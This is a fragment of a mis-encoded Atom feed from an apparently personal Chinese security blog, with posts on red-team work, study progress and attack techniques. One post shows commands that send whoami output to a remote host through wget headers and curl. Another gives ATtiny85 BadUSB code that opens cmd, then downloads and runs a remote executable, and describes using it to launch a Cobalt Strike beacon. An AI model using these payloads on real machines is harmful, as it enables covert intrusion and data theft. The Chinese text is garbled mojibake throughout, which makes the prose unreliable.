title="hwçº¢é˜Ÿ"></a>hwçº¢é˜Ÿ</h2><p>æœ€åæ‰“äº†ä¸€æ¬¡å¿å¸‚çº§çš„hwçº¢é˜Ÿï¼Œå…¶å®è¿˜æ˜¯æŒºä¸¢äººçš„ï¼Œæˆ‘è‡ªå·±çŸ¥é“è‡ªå·±æ°´å¹³ä¸è¡Œï¼Œä½†æ˜¯è¿˜æ˜¯æƒ³å»è¯•è¯•ã€‚è™½ç„¶æœ‹å‹è·Ÿæˆ‘è®²äº†æ˜¯æ— è´£çš„ï¼Œä½†æ˜¯æ‰“äº†é‚£ä¹ˆçƒ‚çš„æˆç»©ï¼Œè‡ªå·±å¿ƒé‡ŒçœŸçš„ä¸å¥½å—ã€‚ã€‚ç›¸æ¯”äºæ‹¿åˆ°å·¥èµ„ï¼Œæ›´å¤šçš„æ˜¯è‡ªè´£å§ã€‚å½“ç„¶äº†ï¼Œåœ¨è¿™æ¬¡çš„çº¢é˜Ÿä¹‹æ—…ä¸­ä¹Ÿå­¦åˆ°äº†ä¸€äº›ä¸œè¥¿ã€‚é¦–å…ˆæ˜¯è‡ªå·±çš„æ¸—é€æ€è·¯é—®é¢˜ï¼Œæ¸—é€æ€è·¯é¦–å…ˆæ˜¯ä¸æ¸…æ™°ï¼Œå…¶æ¬¡æ˜¯å¤ªçª„ã€‚ä¿¡æ¯æ”¶é›†æ—¶ç»å¸¸æœ‰é—æ¼æˆ–è€…å¯¹è¿™ä¸ªç«™åšäº†æŸæ–¹æ³•çš„æ”¶é›†ï¼Œåˆ°äº†ä¸‹ä¸ªç«™å°±å¿˜äº†æˆ–è€…ä¸æƒ³åšäº†ã€‚ã€‚è¿™ä¸ªæ¯›ç—…ä¸çŸ¥é“ä»€ä¹ˆæ—¶å€™èƒ½æ”¹æ‰ã€‚å…¶æ¬¡æ˜¯æ¼æ´çš„åŸç†æŒæ¡çš„ä¸å¤Ÿå¥½å’Œæ¼æ´ç±»å‹æŒæ¡çš„ä¸å¤Ÿå¤šï¼Œç»•wafç­‰æ“ä½œéœ€è¦è¾ƒå¼ºçš„åŸºç¡€æ€§çŸ¥è¯†ã€‚å°±åƒsstiç»•è¿‡ä¸€æ ·~ä¸ç®¡æ€ä¹ˆè¯´ï¼Œçº¢é˜Ÿæ¥äº†è¿™ä¸€è¶Ÿæˆ‘ä¸ªäººæ˜¯ä¸äºçš„ï¼Œä½†æ˜¯å¯¹ä¸èµ·æœ‹å‹äº†ã€‚</p><h2 id="åè¯"><a href="#åè¯" class="headerlink" title="åè¯"></a>åè¯</h2><p>å¸Œæœ›ä¸‹æ¬¡çœ‹åˆ°è¿™ç¯‡åšå®¢ï¼Œèƒ½å¯¹æ¯”å†™æ—¶æœ‰äº›è¿›æ­¥ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;ä»Šå¤©æ˜¯2021å¹´4æœˆ29æ—¥ï¼Œåˆšç»“æŸæŸå¸‚hwé¡¹ç›®ï¼Œåšå®Œè¿™ä¸ªé¡¹ç›®ï¼Œæˆ‘çš„å®ä¹ ç”Ÿæ´»åŸºæœ¬ç®—æ˜¯ç»“æŸäº†ã€‚è¿˜åœ¨é«˜é“ä¸Šï¼Œè¶ç€è¿™ä¸ªæ—¶é—´æ€»ç»“ä¸‹è¿™å››ä¸ªæœˆçš„å®ä¹ &amp;amp;é¡¹ç›®ç”Ÿæ´»ã€‚&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;é‡‘å±±äº‘å®ä¹ &quot;&gt;&lt;a href=&quot;#é‡‘å±±äº‘</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>å‘½ä»¤æ‰§è¡Œç»“æœå¤–å¸¦</title>
    <link href="https://polosec.github.io/2021/04/18/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%93%E6%9E%9C%E5%A4%96%E5%B8%A6/"/>
    <id>https://polosec.github.io/2021/04/18/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%93%E6%9E%9C%E5%A4%96%E5%B8%A6/</id>
    <published>2021-04-17T18:25:55.000Z</published>
    <updated>2021-04-17T21:37:56.341Z</updated>
    
    <content type="html"><![CDATA[<p>wget â€“header=â€test:$(whoami)â€ <a href="http://ssti.com:5000/?username%5C=1">http://ssti.com:5000\?username\=1</a></p><img src="http://cdn.polowong.top/static/images/wget1.png"><p>whoami | curl -F â€œ:data=@-â€œ <a href="http://ssti.com:5000/?username%5C=1">http://ssti.com:5000\?username\=1</a>  </p><img src="http://cdn.polowong.top/static/images/curl1.png"><p>Curl â€œ<a href="http://ssti.com:5000/?username=&#96;whoami&#96;&quot;">http://ssti.com:5000?username=&#96;whoami&#96;&quot;</a></p><img src="http://cdn.polowong.top/static/images/curl2.png">]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;wget â€“header=â€test:$(whoami)â€ &lt;a href=&quot;http://ssti.com:5000/?username%5C=1&quot;&gt;http://ssti.com:5000\?username\=1&lt;/a&gt;&lt;/p&gt;
&lt;img src=&quot;http://cd</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>badusbè¸©å‘&amp;è¿‘æœŸæ„Ÿæƒ³</title>
    <link href="https://polosec.github.io/2021/03/29/badusb%E8%B8%A9%E5%9D%91-%E8%BF%91%E6%9C%9F%E6%84%9F%E6%83%B3/"/>
    <id>https://polosec.github.io/2021/03/29/badusb%E8%B8%A9%E5%9D%91-%E8%BF%91%E6%9C%9F%E6%84%9F%E6%83%B3/</id>
    <published>2021-03-29T12:34:48.000Z</published>
    <updated>2021-11-04T04:22:37.815Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>å‰è¨€ï¼š</p><p>è¿‘æœŸåœ¨å…¬å¸å†…éƒ¨å­¦äº†ä¸€ç‚¹çº¢é˜ŸæŠ€èƒ½ï¼Œè™½ç„¶ç›®å‰ç”¨ä¸ä¸Šï¼Œä½†æ˜¯åšä¸ªè®°å½•ï¼Œé¡ºä¾¿å‘ç‰¢éªšã€‚</p></blockquote><h1 id="è‡´è°¢-amp-å‚è€ƒ"><a href="#è‡´è°¢-amp-å‚è€ƒ" class="headerlink" title="è‡´è°¢&amp;å‚è€ƒ"></a>è‡´è°¢&amp;å‚è€ƒ</h1><p><a href="https://www.freebuf.com/articles/system/261020.html">https://www.freebuf.com/articles/system/261020.html</a></p><p><a href="https://blog.csdn.net/sxhexin/article/details/87914649">https://blog.csdn.net/sxhexin/article/details/87914649</a></p><p><a href="https://www.anquanke.com/post/id/227477">https://www.anquanke.com/post/id/227477</a></p><p><a href="https://www.freebuf.com/articles/system/261020.html">https://www.freebuf.com/articles/system/261020.html</a></p><h1 id="Badusb-æ’å…¥ä¸Šçº¿cobalt-strike"><a href="#Badusb-æ’å…¥ä¸Šçº¿cobalt-strike" class="headerlink" title="Badusb æ’å…¥ä¸Šçº¿cobalt strike"></a>Badusb æ’å…¥ä¸Šçº¿cobalt strike</h1><h2 id="å‡†å¤‡å·¥ä½œ"><a href="#å‡†å¤‡å·¥ä½œ" class="headerlink" title="å‡†å¤‡å·¥ä½œ"></a>å‡†å¤‡å·¥ä½œ</h2><p>ATtiny85 å¼€å‘æ¿ã€arduino IDEä¸‹è½½<a href="https://www.arduino.cc/en/Main/Softwaredigispark%E3%80%82%E6%9A%82%E6%97%B6%E5%85%88%E4%B8%8D%E8%A6%81%E8%A3%85%E9%A9%B1%E5%8A%A8%EF%BC%81%EF%BC%81%E9%A9%B1%E5%8A%A8%E6%9C%89%E5%A4%A7%E5%9D%91%E3%80%82">https://www.arduino.cc/en/Main/Softwaredigisparkã€‚æš‚æ—¶å…ˆä¸è¦è£…é©±åŠ¨ï¼ï¼é©±åŠ¨æœ‰å¤§å‘ã€‚</a></p><p>çœ‹freeebufé‡Œé¢çš„æ•™ç¨‹è£…å®Œé©±åŠ¨ï¼Œçƒ§å½•å®Œåªèƒ½æ‰§è¡Œä¸€æ¬¡ï¼Œéœ€è¦æ›´æ–°ä¸‹å›ºä»¶æ‰å¯ä»¥é‡å¤ä½¿ç”¨ï¼Œåé¢ä¼šæåˆ°ã€‚</p><h2 id="ç¯å¢ƒé…ç½®"><a href="#ç¯å¢ƒé…ç½®" class="headerlink" title="ç¯å¢ƒé…ç½®"></a>ç¯å¢ƒé…ç½®</h2><p>æ‰“å¼€IDE,åœ¨æ–‡ä»¶-&gt;é¦–é€‰é¡¹ä¸­åŠ å…¥é™„åŠ å¼€å‘æ¿ç®¡ç†ï¼Œé™„åŠ å¼€å‘æ¿ç®¡ç†ç½‘å€å¤„å†™</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;digistump.com&#x2F;package_digistump_index.json</span><br></pre></td></tr></table></figure><p>æ³¨æ„ï¼Œè¿™é‡Œéœ€è¦ç¿»å¢™ï¼Œåé¢æ·»åŠ å¼€å‘æ¿ä¸‹è½½ç›¸å…³é…ç½®æ—¶ä¹Ÿéœ€è¦ç¿»å¢™ï¼Œç°åœ¨å°±ç¿»ç€ åˆ«æ–­äº†ã€‚</p><h2 id="æ·»åŠ å¼€å‘æ¿"><a href="#æ·»åŠ å¼€å‘æ¿" class="headerlink" title="æ·»åŠ å¼€å‘æ¿"></a>æ·»åŠ å¼€å‘æ¿</h2><p>IDEä¸­-å·¥å…·-å¼€å‘æ¿ç®¡ç†ï¼Œç±»å‹-contributed/è´¡çŒ®ï¼Œé€‰æ‹©</p><img src="http://cdn.polowong.top/static/images/boards.png"><p>ç„¶åé€‰å®‰è£…ï¼ˆç¿»å¢™ï¼‰</p><p>å®‰è£…å¥½åï¼Œé€‰æ‹©è¿™ä¸ª16.5mhzçš„å¼€å‘æ¿ã€‚</p><img src="http://cdn.polowong.top/static/images/1655.png"><h2 id="æ›´æ–°-boot-loader"><a href="#æ›´æ–°-boot-loader" class="headerlink" title="æ›´æ–° boot loader"></a>æ›´æ–° boot loader</h2><p>æ›´æ–° BootLoaderçš„æ•™ç¨‹çœ‹ <a href="https://blog.csdn.net/sxhexin/article/details/87914649%EF%BC%8C%E8%BF%99%E9%87%8C%E4%B8%8D%E5%86%8D%E8%B5%98%E8%BF%B0%EF%BC%8C%E8%B7%9F%E7%9D%80%E8%BF%99%E4%B8%AA%E6%95%99%E7%A8%8B%E8%B5%B0%E6%B2%A1%E9%97%AE%E9%A2%98%E7%9A%84%EF%BC%8C%E5%A6%82%E6%9E%9C%E4%BD%A0%E4%B9%8B%E5%89%8D%E6%9C%89%E8%A3%85%E7%9B%B8%E5%85%B3%E9%A9%B1%E5%8A%A8%EF%BC%8C%E8%AF%B7%E6%8A%8A%E9%A9%B1%E5%8A%A8%E5%8D%B8%E8%BD%BD%E5%B9%B2%E5%87%80%EF%BC%81%EF%BC%81%EF%BC%81">https://blog.csdn.net/sxhexin/article/details/87914649ï¼Œè¿™é‡Œä¸å†èµ˜è¿°ï¼Œè·Ÿç€è¿™ä¸ªæ•™ç¨‹èµ°æ²¡é—®é¢˜çš„ï¼Œå¦‚æœä½ ä¹‹å‰æœ‰è£…ç›¸å…³é©±åŠ¨ï¼Œè¯·æŠŠé©±åŠ¨å¸è½½å¹²å‡€ï¼ï¼ï¼</a></p><p>æ›´æ–°BootLoaderæ˜¯å› ä¸ºé¿å…è¸©çƒ§å½•å®Œåªèƒ½è¿è¡Œä¸€æ¬¡çš„å‘ï¼ï¼</p><p>BootLoaderæ˜¯å¤§å‘ï¼Œä¸€å®šè¦å¥½å¥½å¼„ï¼</p><h2 id="ç¼–å†™ä»£ç "><a href="#ç¼–å†™ä»£ç " class="headerlink" title="ç¼–å†™ä»£ç "></a>ç¼–å†™ä»£ç </h2><p>æœ‰å…´è¶£ä¸€æ­¥æ­¥èµ°çš„å¯ä»¥å†™ä¸ªæµ‹è¯•ä»£ç  cmdå¼¹ä¸ªçª—ä»€ä¹ˆçš„ï¼Œæˆ‘è¿™é‡Œä¸€æ­¥åˆ°ä½ï¼Œç›´æ¥è¿œç¨‹åŠ è½½exeã€‚</p><p>å¯¹äºcs å¯ä»¥ç”Ÿæˆpowershellï¼Œç„¶åcmdé‡Œé¢powershellåŠ è½½è°ƒç”¨ç›´æ¥ä¸Šçº¿ã€‚</p><h2 id="ä½¿ç”¨CMDè¿œç¨‹ä¸‹è½½å¯æ‰§è¡Œæ–‡ä»¶"><a href="#ä½¿ç”¨CMDè¿œç¨‹ä¸‹è½½å¯æ‰§è¡Œæ–‡ä»¶" class="headerlink" title="ä½¿ç”¨CMDè¿œç¨‹ä¸‹è½½å¯æ‰§è¡Œæ–‡ä»¶"></a>ä½¿ç”¨CMDè¿œç¨‹ä¸‹è½½å¯æ‰§è¡Œæ–‡ä»¶</h2><p>æˆ‘é€‰æ‹©ç”¨cmdçš„åŸå› æ˜¯å› ä¸º æˆ‘è¿˜ä¸ä¼špowershellå…æ€ï¼ˆ2333ï¼‰</p><p>æ‰€ä»¥ æ¢ç´¢äº†ä¸‹ å¦‚ä½•ç±»ä¼¼Linuxæ‰§è¡Œå¤šæ¡å‘½ä»¤ï¼Œå‘ç°åœ¨Windows cmdä¸‹æ˜¯andç¬¦å·&amp;ã€‚</p><p>æ‰§è¡Œå‘½ä»¤çš„ä»£ç æ¡†æ¶å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;DigiKeyboard.h&quot;</span><span class="comment">//åº“æ–‡ä»¶</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setup</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">// setupå‡½æ•°åªè¿è¡Œä¸€æ¬¡</span></span><br><span class="line">DigiKeyboard.delay(<span class="number">2000</span>);<span class="comment">//ç­‰å¾…ä¸¤ç§’ï¼Œç»™ç”µè„‘è‡ªåŠ¨åŠ è½½é…ç½®æ—¶é—´</span></span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);<span class="comment">//æ‘ä½WINé”®</span></span><br><span class="line">DigiKeyboard.delay(<span class="number">300</span>);<span class="comment">//ç­‰å¾…300æ¯«ç§’</span></span><br><span class="line">DigiKeyboard.println(<span class="string">&quot;cmd&quot;</span>);<span class="comment">//è¾“å…¥CMD</span></span><br><span class="line">DigiKeyboard.delay(<span class="number">300</span>);</span><br><span class="line">DigiKeyboard.println(<span class="string">&quot;curl http://12xxxx0/calc.exe &gt; E:\\calc.exe &amp; E:\\calc.exe&quot;</span>);<span class="comment">//æ‰§è¡ŒPAYLOADï¼ŒåŒå¼•å·éœ€è¦æ–œæ è½¬ä¹‰</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">loop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ³¨æ„ï¼Œåœ¨æœ€åä¸€ä¸ªæ³¨é‡Šå¤„ï¼Œæ˜¯åœ¨å‰é¢è¯­å¥æ‰“å¼€cmdé»‘æ¡†çš„æƒ…å†µä¸‹ï¼Œåœ¨cmdä¸­è¾“å…¥çš„è¯­å¥ã€‚ä¸¤ä¸ªåæ–œæ æ˜¯ä¸ºäº†è½¬ä¹‰ã€‚</p><p>æˆ‘çš„æ€è·¯æ˜¯ï¼Œå°†å¯æ‰§è¡Œexeæ–‡ä»¶ä¸Šä¼ è‡³æœåŠ¡å™¨ï¼Œé€šè¿‡curlçš„æ–¹å¼ä¸‹è½½å¹¶é‡å®šå‘è‡³æŸä¸ªé©±åŠ¨å™¨å¹¶æ‰§è¡Œã€‚</p><p>æˆ‘æœ¬æ¥æƒ³æ”¾åˆ°Cç›˜ï¼Œä½†æ˜¯æ”¾åˆ°Cç›˜ï¼Œæœ‰å¯èƒ½å­˜åœ¨æƒé™é—®é¢˜ï¼ˆæ”¾åœ¨C:\Windows\Tempï¼‰ç›®å½•ä¸‹ä¹Ÿæœ‰äº›é—®é¢˜ï¼Œäºæ˜¯æ”¾åˆ°äº†D/Eç›˜ã€‚</p><p>å°†ä¸Šè¿°ä»£ç åœ¨IDEä¸­è¾“å…¥åctrl+uä¸Šä¼ ï¼Œç„¶åæ’å…¥attiny85 </p><img src="http://cdn.polowong.top/static/images/in1.png"><p>ä¸€å®šæ˜¯å…ˆæ‹”å‡ºæ¥ï¼Œå‡ºç°è¿™ä¸ª 60secondsçš„æ—¶å€™æ’è¿›å»ï¼Œå‡ºç°ä¸‹é¢è¿™ä¸€ä¸²ä»£è¡¨å†™å…¥æˆåŠŸ å¹¶ä¸”ä¼šè‡ªåŠ¨æ‰§è¡Œä¸€æ¬¡ã€‚</p><p>ç„¶åæ‹”å‡ºæ¥ å†æ’è¿›å»çš„æ—¶å€™ å°±æœ‰å¼¹è®¡ç®—å™¨çš„æ•ˆæœäº†ã€‚ï¼ˆå°æ€è€ƒï¼Œå¦‚ä½•åœ¨æ‰§è¡Œå®Œexeåè‡ªåŠ¨å…³é—­cmdé»‘æ¡†ï¼Ÿï¼‰</p><p>æ•ˆæœå¦‚ä¸‹ï¼š</p><img src="http://cdn.polowong.top/static/images/åå¼¹.gif"><h2 id="CMDä¸Šçº¿CS"><a href="#CMDä¸Šçº¿CS" class="headerlink" title="CMDä¸Šçº¿CS"></a>CMDä¸Šçº¿CS</h2><p>å«–æ¥äº†å¤§ä½¬çš„å…æ€æ–¹æ³•2333 è¯•ä¸€ä¸‹exeä¸Šçº¿cs</p><img src="http://cdn.polowong.top/static/images/cs.gif"><p>å°æ€è€ƒçš„ç­”æ¡ˆæ˜¯ï¼šå‘½ä»¤åè·Ÿ&amp; exit;</p><p>23333 </p><h1 id="æ‚è°ˆ"><a href="#æ‚è°ˆ" class="headerlink" title="æ‚è°ˆ"></a>æ‚è°ˆ</h1><p><img src="http://cdn.polowong.top/1635999756597dkayi5vd.png?imageslim" alt="paste image"><br>5pyA6L+R5LiN5pivaHfkuYjvvIzorqTor4bkuIDkuKrlhazlj7jnmoRocuWnkOWnkO+8jOacgOi/keS5n+WcqGh35oub5Lq677yM6ZyA6KaB5LiA5Lqb5pyJ5omL5bCx6KGM55qE5bKX5L2N77yM5a+55rKh5Y67aHfov4cg5bm25LiU5oqA5pyv5LiN5oCO5LmI5qC355qE5ZCM5a2m5p2l6K+077yMNDAw5LiA5aSp55qE5b6F6YGH44CB5YyF5ZCD5L2P44CB5LiN6ZyA6KaB6Ieq5bex5Z6r6ZKx44CB6aG555uu546w5Zy65pyJ5Lq65bim77yM5oiR6KeJ5b6X5bey57uP5b6I5aW95ZWm44CC5aaC5p6c5oiR5aSn5LqM55qE5pe25YCZ5pyJ6L+Z56eN5py65Lya77yM5ZOq5oCV5LiN57uZ5oiR5bel6LWE77yM5oiR5Lmf6KaB5Y6744CC5oiR5L2c5Li65LiA5Liq5a2m55Sf77yM6Zmk5LqG5aSW5Ye66Ieq5bex5o6l6aG555uu77yM5a6e5Zyo5piv5oOz5LiN5Yiw6L+Y5pyJ5LuA5LmI5q+UaHfmm7Tlpb3nmoTog73nm7jlr7nku47nroDljZXlvIDlp4vmjqXop6blronlhajlrp7miJjnmoTlnLrmma/kuobjgILvvIhTUkPkuI3nrpfvvIxTUkPkuZ/pnIDopoHnm7jlvZPnmoTlronlhajln7rnoYDjgILvvInmiJHmiorov5nkuKrmtLvmjqjov4fljrvkuYvlkI7vvIzkuInkuKrluIjlvJ/kuZ/lvojnu5nlipvvvIzpgJrov4fkuobpnaLor5XjgILlj6/kuIfkuIfmsqHmg7PliLDor7flgYfnmoTml7blgJnlh7rpl67popjkuobvvIzlr7zlkZjor7TnjrDlnKjnmoTph43lv4PlupTor6XmmK/kuJPkuJror77lrabkuaDjgIHogIzkuI3mmK/mg7PnnYDlh7rljrvlrp7kuaDvvIzlubbkuJTmi7/miJHkuL7kvovlrZAyMzMz44CC5pyA5ZCO6L+Y6K+077yM5Y+q6KaB5L2g5Y675LqG5bCx57uZ5L2g6YCA5a2m77yM55yf5LiN5oiz44CC54S26ICM5pu05Y+v56yR55qE5piv77yM5p+Q6ICB5biI5ZyoMTfnuqfpgJrnn6XnvqTlj5Hkuoblj6bkuIDlrrbmnLrmnoTnmoRod+Wuo+S8oO+8jOW+hemBh+aIkeS5n+ivtOS4i++8jDMwMC00MDDkuIDlpKnvvIzkuI3ljIXlkIPkvY/vvIzmnInlhY3otLnln7norq3vvIzmoLnmja7ln7norq3ogIPmoLjnu5PmnpzliIbnuqLok53pmJ/vvIjvvJ/vvInvvIznhLblkI7miJHmiZPnlLXor53ov4fljrvpl67kuobkuIvvvIzmu6HlmLTot5/miJHosIjnkIbmg7PosIjpgZPlvrfosIjmioDmnK/jgIHlsLHor7TlrabnlJ/kuI3opoHogIHmg7PnnYDmjKPpkrHkupHkupHjgILmiJHkvLDorqEg5LiN57uZ5oiR6L+Z5LiJ5Liq5biI5byf5YGH55qE5Y6f5Zug77yM5bqU6K+l5piv5Yqo5LqG5LuW5Lus55qE6JuL57OV5LqG5ZCn77yM5LuO6YKj6L656LWw6IO95oq96ZKxMjMzM+OAguWtpumZouWvueaIkeW+iOWlveOAgeWQhOS9jemihuWvvOiAgeW4iOWSjOiUvOWPr+S6su+8jOWtpumZouS5n+e7meS6huaIkeaOqOWFjeWQjemine+8jOmhuuWIqeaOqOWFjeiHs1VFU1RD44CC5b+D5oCA5oSf5oGp5LmL5b+D77yM5oOz5o6o5biI5byf5LiA5oqK77yM5Y67aHfvvIzmsqHmg7PliLDnq5/nhLbkuI3nu5nlh4blgYfvvIznnJ/nmoTvvIzlv4Pph4zpnaLlh4nkuoblvojlpJrjgILkuI3or7TkuoZ+57un57ut5YaZ5q+V5Lia6K665paH5LqGfg==</p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;å‰è¨€ï¼š&lt;/p&gt;
&lt;p&gt;è¿‘æœŸåœ¨å…¬å¸å†…éƒ¨å­¦äº†ä¸€ç‚¹çº¢é˜ŸæŠ€èƒ½ï¼Œè™½ç„¶ç›®å‰ç”¨ä¸ä¸Šï¼Œä½†æ˜¯åšä¸ªè®°å½•ï¼Œé¡ºä¾¿å‘ç‰¢éªšã€‚&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;è‡´è°¢-amp-å‚è€ƒ&quot;&gt;&lt;a href=&quot;#è‡´è°¢-amp-å‚è€ƒ&quot; class=&quot;headerlink</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>è¿‘ä¸€å¹´å­¦ä¹ æ€»ç»“</title>
    <link href="https://polosec.github.io/2021/03/06/%E8%BF%91%E4%B8%80%E5%B9%B4%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/"/>
    <id>https://polosec.github.io/2021/03/06/%E8%BF%91%E4%B8%80%E5%B9%B4%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/</id>
    <published>2021-03-06T08:56:06.000Z</published>
    <updated>2021-03-06T09:10:50.739Z</updated>
    
    <content type="html"><![CDATA[<p>è™½ç„¶æ¥è§¦å®‰å…¨ä»åˆä¸­å°±ç®—å¼€å§‹äº†ï¼Œä½†å½“æ—¶ä¹Ÿä»…ä»…æ˜¯åœç•™äºæ··æ··å¨±ä¹åœˆï¼Œæ—¥ä¸€æ—¥åˆ«äººçš„webshellã€‚</p><p>å¤§ä¸€å¤§äºŒå¯¹å®‰å…¨çŸ¥è¯†çš„å­¦ä¹ è¾ƒå°‘ï¼Œå¤§äºŒå¤–å‡ºæ‰“äº†ä¸¤æ¬¡æ¯”èµ›ï¼Œæˆç»©è¾ƒå·®ï¼Œç›´æ¥ç™½ç»™ã€‚</p><p>å¤§ä¸‰å¯’å‡ç–«æƒ…åœ¨å®¶çš„æ—¶å€™ç®—æ˜¯æ­£å¼å¼€å§‹å­¦ä¹ å®‰å…¨çŸ¥è¯†ï¼Œåšæœ€ç®€å•çš„é¶åœºï¼Œåˆ·é¢˜ï¼Œå‰ä¸¤æ¬¡æ­£ç»æ‰“çš„æ¯”èµ›æ˜¯Iæ˜¥ç§‹é«˜æ ¡æŠ—ç–«å’ŒBJDCTFã€‚</p><p>è¿™æ˜¯ä¸€ä¸ªçº ç»“çš„è¿‡ç¨‹ï¼Œå› ä¸ºåœ¨é‚£ä¸ªé˜¶æ®µæˆ‘è¿˜è¦å‡†å¤‡ä¿ç ”ï¼Œè¿˜åœ¨ä¿ç ”å’Œè€ƒç ”ä¸¤è€…ä¹‹é—´æ‘‡æ‘†ã€‚</p><p>æœ€ç»ˆä¸‹å®šå†³å¿ƒå†²ä¸€å†²ï¼Œé‚£æ˜¯ä¸‰æœˆåº•ã€‚æŸå…¬ä¼—å·é¢„æµ‹æˆ‘ä¿ç ”æˆåŠŸç‡åœ¨30%å·¦å³ã€‚</p><p>å…·ä½“å­¦ä»€ä¹ˆçŸ¥è¯†åœ¨è¿™é‡Œä¹Ÿä¸æƒ³è¯´äº†ï¼Œç®—æ˜¯ä»æœ€åŸºç¡€çš„å¼€å§‹å­¦ä¹ å§ï¼Œå°è±¡æ¯”è¾ƒæ·±çš„æ˜¯LFIã€‚ç°åœ¨æˆ‘XSSå’Œæ³¨å…¥ç©çš„ä¹Ÿä¸å¥½ï¼Œç®—æ˜¯åªä¼šç”¨å·¥å…·è·‘è·‘ã€‚</p><p>ä¿å®Œç ”ä¹‹åæœ‰äº›è®¸æ¾æ‡ˆï¼Œå¯¹å®‰å…¨çŸ¥è¯†çš„å­¦ä¹ æœ‰äº›æ‡ˆæ€ äº†ï¼ŒSRCè¿˜æ²¡å¼€å§‹æï¼Œåˆ°ç°åœ¨ä¸Šç­æ—¶é—´ä¹Ÿä¸å¤ªå……è£•ã€‚</p><p>ç°åœ¨æ­£å¥½æ˜¯ä¸‰æœˆåˆï¼Œè·ç¦»æˆ‘å¼€å§‹æ­£å¼æ¥è§¦å®‰å…¨ä¹Ÿå·®ä¸å¤šä¸€å¹´çš„æ—¶é—´ï¼Œåœ¨è¿™ä¸€å¹´é‡Œï¼Œæˆ‘åšåˆ°äº†ï¼š</p><p>1.ä¸¤ä»½æ¸—é€å²—å®ä¹ ç»å†</p><p>2.ä¸¤æ¬¡é€šè¿‡æŠ¤ç½‘é¢è¯•ï¼Œä¸€æ¬¡ä¸­çº§ï¼Œä¸€æ¬¡åˆçº§ã€‚ï¼ˆè“é˜Ÿ</p><p>3.æ‹¿åˆ°äº”æ‰€985ç½‘ç»œå®‰å…¨ä¸“ä¸šOFFER,å…¶ä¸­å››ä¸ªå­¦ç¡•;</p><p>4.æ•°æ¬¡å‚åŠ çº¿ä¸Šèµ›ï¼Œè™½ç„¶ç™½ç»™çš„è¾ƒå¤š</p><p>5.ä¸¤æ¬¡å¸¦é˜Ÿå‚åŠ çœèµ›</p><p>6.å¼€å§‹æ‰“AWD</p><p>7.ç‹¬ç«‹å‘è¡¨ä¸€ç¯‡è®ºæ–‡</p><p>8.ç‹¬ç«‹å®Œæˆä¸¤ä¸ªå°é¡¹ç›®</p><p>9.ç¾èµ›å»ºæ¨¡ä¸€ç­‰å¥–</p><p>10.è‡ªè´¹MacBook Pro</p><p>11.ç»æµç‹¬ç«‹</p><p>12.é¡ºåˆ©ä¿ç ”</p><p>ä¸‹ä¸€å¹´æ¸´æœ›æ›´å¥åº·çš„èº«ä½“ä¸ç›¸å¯¹åšå¼ºçš„æ„å¿—ï¼Œè‡³å°‘ä¸èƒ½ä¸­åˆä¸€è§‰ç¡ä¸‰ä¸ªå°æ—¶ã€‚</p><p>ä»…æ­¤è®°å½•</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;è™½ç„¶æ¥è§¦å®‰å…¨ä»åˆä¸­å°±ç®—å¼€å§‹äº†ï¼Œä½†å½“æ—¶ä¹Ÿä»…ä»…æ˜¯åœç•™äºæ··æ··å¨±ä¹åœˆï¼Œæ—¥ä¸€æ—¥åˆ«äººçš„webshellã€‚&lt;/p&gt;
&lt;p&gt;å¤§ä¸€å¤§äºŒå¯¹å®‰å…¨çŸ¥è¯†çš„å­¦ä¹ è¾ƒå°‘ï¼Œå¤§äºŒå¤–å‡ºæ‰“äº†ä¸¤æ¬¡æ¯”èµ›ï¼Œæˆç»©è¾ƒå·®ï¼Œç›´æ¥ç™½ç»™ã€‚&lt;/p&gt;
&lt;p&gt;å¤§ä¸‰å¯’å‡ç–«æƒ…åœ¨å®¶çš„æ—¶å€™ç®—æ˜¯æ­£å¼å¼€å§‹å­¦ä¹ å®‰å…¨çŸ¥è¯†ï¼Œåšæœ€ç®€å•çš„é¶åœºï¼Œåˆ·é¢˜ï¼Œå‰ä¸¤æ¬¡æ­£</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>è®°ä¸€æ¬¡çº¿ä¸ŠAWD</title>
    <link href="https://polosec.github.io/2021/02/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%BA%BF%E4%B8%8AAWD/"/>
    <id>https://polosec.github.io/2021/02/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%BA%BF%E4%B8%8AAWD/</id>
    <published>2021-02-24T16:24:25.000Z</published>
    <updated>2021-02-24T16:52:22.848Z</updated>
    
